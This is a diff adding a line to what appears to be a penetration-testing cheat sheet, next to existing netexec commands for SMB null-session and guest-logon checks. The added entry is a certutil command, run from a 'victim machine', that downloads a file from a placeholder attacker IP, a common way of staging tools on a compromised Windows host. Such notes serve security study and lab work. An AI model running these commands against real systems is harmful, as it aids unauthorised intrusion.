@@ -18,6 +18,9 @@ Test null session (SMB port 445)
 Test for guest logon (SMB port 445)
 - `nxc smb $IP -u 'a' -p ''`
 
+File transfer using certutil (Ran from victim machine)
+- `certutil -urlcache -f http://<attacker_ip>/example.txt example.txt`
+
 ## Linux:
 
 ## Active Directory:
